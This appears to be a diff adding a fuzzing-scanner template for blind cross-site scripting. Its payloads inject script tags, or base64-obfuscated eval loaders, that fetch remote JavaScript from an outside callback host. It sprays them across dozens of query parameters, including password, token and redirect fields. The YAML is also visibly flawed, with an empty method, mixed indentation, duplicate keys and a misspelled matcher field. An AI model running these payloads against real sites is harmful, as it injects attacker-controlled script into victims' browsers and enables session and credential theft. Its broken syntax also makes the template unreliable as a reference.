@@ -1,0 +1,139 @@
+id: bxss_fuzzing
+
+info:
+  name: Blind XSS Fuzzing
+  author: abdulrahman
+  severity: high
+
+requests:
+  - method:
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      bxss:
+        - "'\"><script src=//xss.report/s/abdulrahman></script>"
+        - "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL2FiZHVscmFobWFuIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>"
+        - "javascript:eval('var a=document.createElement(\'script\');a.src=\'//xss.report/s/abdulrahman\';document.body.appendChild(a)')"
+        - "\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL2FiZHVscmFobWFuIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>"
+        - "\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL2FiZHVscmFobWFuIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>"
+        - "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//xss.report/s/abdulrahman\");a.send();</script>"
+        - "<script>$.getScript(\"//xss.report/s/abdulrahman\")</script>"
+        - "var a=document.createElement(\"script\");a.src=\"//xss.report/s/abdulrahman\";document.body.appendChild(a);"
+
+    fuzzing:
+      - part: query
+        mode: single
+        keys:
+	  - q
+	  - s
+	  - search
+	  - lang
+	  - keyword
+	  - query
+	  - page
+	  - keywords
+	  - year
+	  - view
+	  - email
+	  - type
+	  - name
+	  - p
+	  - callback
+	  - jsonp
+	  - api_key
+	  - api
+	  - password
+	  - email
+	  - emailto
+	  - token
+	  - username
+	  - csrf_token
+	  - unsubscribe_token
+	  - id
+	  - item
+	  - page_id
+	  - month
+	  - immagine
+	  - list_type
+	  - url
+	  - terms
+	  - categoryid
+	  - key
+	  - l
+	  - begindate
+	  - enddate
+          - callback
+          - checkout
+          - checkout_url
+          - continue
+          - data
+          - dest
+          - destination
+          - dir
+          - domain
+          - feed
+          - file
+          - file_name
+          - file_url
+          - folder
+          - folder_url
+          - forward
+          - from_url
+          - go
+          - goto
+          - host
+          - html
+          - image_url
+          - img_url
+          - load_file
+          - load_url
+          - login_to
+          - login_url
+          - logout
+          - navigation
+          - next
+          - next_page
+          - open
+          - out
+          - page
+          - page_url
+          - path
+          - port
+          - redir
+          - redirect
+          - redirect_to
+          - redirect_uri
+          - redirect_url
+          - reference
+          - return
+          - return_path
+          - return_to
+          - return_url
+          - returnTo
+          - rt
+          - rurl
+          - show
+          - site
+          - target
+          - to
+          - uri
+          - url
+          - val
+          - validate
+          - view
+          - window
+
+      - type: query
+        mode: single
+        values:
+          - "https?://"
+        fuzz:
+          - "{{bxss}}"
+
+    matchers:
+      - type: word
+        bart: body
+        words:
+          - "abdulrahman"
+
